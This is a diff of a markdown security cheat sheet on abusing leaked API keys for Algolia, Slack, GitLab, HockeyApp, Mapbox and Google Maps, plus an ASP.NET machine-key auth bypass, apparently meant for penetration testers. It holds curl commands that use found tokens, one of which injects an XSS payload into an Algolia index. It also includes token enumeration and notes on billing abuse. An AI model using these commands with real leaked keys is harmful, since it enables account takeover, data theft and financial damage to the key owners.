@@ -1,11 +1,12 @@
 # API Key Leaks
 
-> The API key is a unique identifier that is used to authenticate requests associated with your project. Some developpers might hardcode them or leave it on public shares.
+> The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.
 
 ## Summary
 
 - [Tools](#tools)
 - [Exploit](#exploit)
+    - [Google Maps](#google-maps)
     - [Algolia](#algolia)
     - [AWS Access Key ID & Secret](#aws-access-key-id--secret)
     - [Slack API Token](#slack-api-token)
@@ -15,7 +16,9 @@
     - [Twitter API Secret](#twitter-api-secret)
     - [Twitter Bearer Token](#twitter-bearer-token)
     - [Gitlab Personal Access Token](#gitlab-personal-access-token)
+    - [HockeyApp API Token](#hockeyapp-api-token)
     - [Auth Bypass using pre-published Machine Key](#auth-bypass-using-pre-published-machine-key)
+    - [Mapbox API Token](#Mapbox-API-Token)
 
 
 ## Tools
@@ -25,7 +28,15 @@
 
 ## Exploit
 
-The following commands can be used to takeover accounts or extract personnal informations from the API using the leaked token.
+The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.
+
+### Google Maps 
+
+Use : https://github.com/ozguralp/gmapsapiscanner/
+
+Impact:
+* Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
+* Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account
 
 ### Algolia 
 
@@ -36,14 +47,6 @@ curl --request PUT \
   --header 'x-algolia-api-key: <example-key>' \
   --header 'x-algolia-application-id: <example-application-id>' \
   --data '{"highlightPreTag": "<script>alert(1);</script>"}'
-```
-
-### AWS Access Key ID & Secret
-
-```powershell
-git clone https://github.com/andresriancho/enumerate-iam
-cd enumerate-iam
-./enumerate-iam.py --access-key AKIA... --secret-key XXX..
 ```
 
 ### Slack API Token
@@ -89,6 +92,13 @@ curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_toke
 ```
 
 
+### HockeyApp API Token
+
+```powershell
+curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
+```
+
+
 ### Auth Bypass using pre-published Machine Key
 
 > By default, ASP.NET creates a Forms Authentication Ticket with unique a username associated with it, Date and Time at which the ticket was issued and expires. So, all you need is just a unique username and a machine key to create a forms authentication token
@@ -112,8 +122,20 @@ $ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
 ```
 
 
+### Mapbox API Token
+A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.
+```
+#Check token validity
+curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
+
+#Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)
+curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
+```
+
 ## References
 
 * [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
 * [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
 * [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
+* [Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
+* [Mapbox API Token Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/)
